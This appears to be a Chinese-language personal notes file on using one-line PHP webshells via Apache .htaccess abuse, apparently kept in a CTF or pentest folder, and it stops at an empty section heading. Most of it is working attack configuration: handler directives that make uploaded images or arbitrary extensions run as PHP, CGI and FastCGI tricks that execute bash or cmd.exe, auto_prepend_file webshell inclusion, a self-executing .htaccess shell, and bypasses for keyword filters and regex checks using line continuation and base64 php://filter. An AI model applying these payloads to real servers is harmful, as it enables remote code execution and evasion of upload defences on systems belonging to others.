# 一句话木马使用指南

## 0x00 前言

这个文档记录了当前文件夹下的一句话木马相关的解释，以及使用方法.

写文档是怕自己忘记，做以下记录。

## 0x01 .htaccess

参考链接：[https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/](https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/)

### 1. 介绍

`.htaccess`文件中文名是分布式配置文件,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法。



`.htaccess`是一个纯文本文件，存放着一些apache指令，与`httpd.conf`类似，但作用范围仅限当前目录。

### 2.利用

#### 1) SetHandler指定解析器

**1. 为当前文件夹、子文件夹下的文件指定解析器**

> pwd:`htaccess/2.1.1/.htaccess`

```.htaccess
SetHandler application/x-httpd-php  # 指定解析器，此处为PHP
```

解读：同目录下的所有文件都会被当作php文件，如果文件中含有合法的PHP代码，就会被执行。

**2. 为文件名含有某字符串的文件指定解析器**

> pwd:`htaccess/2.1.2/.htaccess`

```
<FilesMatch "2020">
SetHandler application/x-httpd-php  # 指定解析器，此处为PHP
</FilesMatch>
```

解读：FilesMatch匹配包含`2020`字符串的文件，可为文件名或文件后缀，可自行修改。然后编写一句话木马，保存为`20200203.jpg`，与`.htaccess`放在同一目录下，使用蚁剑等工具连接。
 这是因为访问包含`2020`字样的文件，都会交由PHP解析器处理，若文件包含合法的PHP代码，将被执行。

**3. 为指定目录下的文件夹指定解析器**

>  pwd:`htaccess/2.1.3/.htaccess`

```
<Directory /var/www/html/web/upload>
SetHandler application/x-httpd-php
</Directory>
```

解读：Directory指定一个目录，这个目录下的所有文件都交给PHP进行解析，有合法的PHP代码会被执行。

**4. 指定服务器状态解析器**

> pwd:`htaccess/2.1.4/.htaccess`

```
SetHandler server-status
```

解读：这种方式利用了apache的服务器状态信息(默认关闭)，可以查看所有访问本站的记录。

访问的url是`http://ip:host/.htaccess路径/serber-status?refresh=5`。refresh指定刷新时间。

**5. 指定cgi-script解析器，执行文件**

**第一种、CGI启动方式：**

>  pwd:`htaccess/2.1.5/1/.htaccess`

.htaccess:

```
Options +ExecCGI
AddHandler cgi-script .xx
```

linux编辑1.xx(格式要求严格):

```
#! /bin/bash

echo Content-type: text/html

echo ""

cat /flag
```

windows编辑2.xx

```
#!C:/Windows/System32/cmd.exe /c start calc.exe
1
```

解说：Options ExecCGI表示允许CGI执行，如果AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了。

利用条件：

- 保证htaccess会被解析，即当前目录中配置了`AllowOverride all或AllowOverride Options  FileInfo。AllowOverride参数具体作用可参考Apache之AllowOverride参数详解。(Require all  granted也是需要的)
- cgi_module被加载。即apache配置文件中有LoadModule cgi_module modules/mod_cgi.so这么一句且没有被注释。
- 有目录的上传、写入权限。

**第二种、FastCGI启动方式**

windows下的.htaccess:

```
Options +ExecCGI
AddHandler fcgid-script .abc
FcgidWrapper "C:/Windows/System32/cmd.exe /c start cmd.exe" .abc
```

linux下的.htaccess:

```
Options +ExecCGI
AddHandler fcgid-script .abc
FcgidWrapper "whoami" .abc
```

上传.htaccess文件后，在随意上传一个.abc，内容无所谓。

解说：老样子，如果默认就开启了ExecCGI，则第一句可以省略。

第二句表示，abc后缀名的文件需要被fcgi来解析。AddHandler还可以换成AddType。

利用条件：

- AllowOverride all或AllowOverride Options FileInfo。
- 2.mod_fcgid.so被加载。即apache配置文件中有LoadModule fcgid_module modules/mod_fcgid.so
- 有目录的上传、写入权限。

#### 2) AddType指定后缀文件解析类型

```
AddType application/x-httpd-php .a
```

解说：将所有文件后缀为.a的文件解析为php

#### 3) php_value

这种方式可通过`php_value`来配置PHP的配置选项；另外`php_flag name on|off`用来设定布尔值的配置指令

.htaccess可以使两种配置模式生效：`PHP_INI_PREDIR`和`PHP_INI_ALL`

[php.ini配置选项列表](https://www.php.net/manual/zh/ini.list.php)查看可以用配置项

**1. 文件包含**

> - `auto_prepend_file`：指定一个文件，在主文件解析之前自动解析
> - `auto_append_file`：指定一个文件，在主文件解析后自动解析

编辑.htaccess为：

```
AddType application/x-httpd-php .a
php_value auto_prepend_file webshell.a
```

或：

```
AddType application/x-httpd-php .a
php_value auto_append_file webshell.a
```

上传webshell文件为:

```
<?=phpinfo();
```

再任意访问一个php文件，就会执行webshell文件(php)。

**2. 绕过preg_math的配置**

编辑.htaccess：

```
php_value pcre.backtrack_limit 0
php_value pcre.jit 0
```

这样就能绕过preg_math的正则匹配。

#### 4) 直接使用.htaccess shell

.htaccess文件：

```
<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
SetHandler application/x-httpd-php
# <?php phpinfo(); ?>
```

解说：首先设置了禁用拒绝规则，这样便可直接访问到.htaccess；接着用`SetHandler`将所有文件作为php解析，最后写入php代码，开头用`#`注释掉，这样便可成功解析.htaccess，然后解析php，访问.htaccess文件就能执行。

相关的关于.htaccess的shell，可参考github上一个项目(以后再研究)：

```
https://github.com/wireghoul/htshells
```

### 3.Bypass方式

#### 1）关键词检测

**1、反斜杠回车绕过**

```
AddT\
ype application/x-httpd-php .abc
```

**2. php代码检测绕过**

```
AddType application/x-httpd-php .a
php_value auto_prepend_file php://filter/convert.base64-decode/resource=webshell.a
```

然后上传的webshell.a为base64加密后的文件。

## 0x02 